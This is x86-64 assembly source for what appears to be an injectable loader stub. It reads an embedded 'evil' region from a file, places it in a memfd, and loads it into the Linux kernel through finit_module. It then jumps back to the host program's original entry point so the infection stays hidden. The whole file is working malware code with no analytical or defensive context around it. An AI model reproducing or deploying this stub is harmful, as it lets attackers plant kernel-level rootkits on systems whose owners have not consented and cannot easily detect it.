.intel_syntax noprefix

base:
    jmp entry

off:
    .space 8

evil_base:
    .space 8

evil_size:
    .space 8

zero:
    .asciz ""

entry:
    push rdi
    push rsi
    push rdx
    push r10
    push r8
    push r9

payload:
# open(file, 0, 0)
    mov rax, 2
    lea rdi, [rip + file]
    mov rsi, 0
    mov rdx, 0
    syscall
    cmp rax, 0
    jl return

# mmap(0, evil_size, 1, 2, fd, evil_base)
    mov r8, rax
    mov rax, 9
    mov rdi, 0
    mov rsi, [rip + evil_size]
    mov rdx, 1
    mov r10, 2
    mov r9, [rip + evil_base]
    syscall
    cmp rax, -1
    je return

# push address onto stack
    push rax

# memfd_create("yee", 1)
    mov rax, 319
    lea rdi, [rip + yee]
    mov rsi, 1
    syscall
    cmp rax, 0
    jl return

# write(fd, address, evil_size)
    pop rsi
    push rax
    mov rdi, rax
    mov rax, 1
    mov rdx, [rip + evil_size]
    syscall

# finit_module(fd, "", 0)
    pop rdi
    mov rax, 313
    lea rsi, [rip + zero]
    mov rdx, 0
    syscall

return:
    mov rax, [rip + off]
    lea rcx, [rip + base]
    sub rcx, rax
    pop r9
    pop r8
    pop r10
    pop rdx
    pop rsi
    pop rdi
    jmp rcx

yee:
    .asciz "yee"
file:
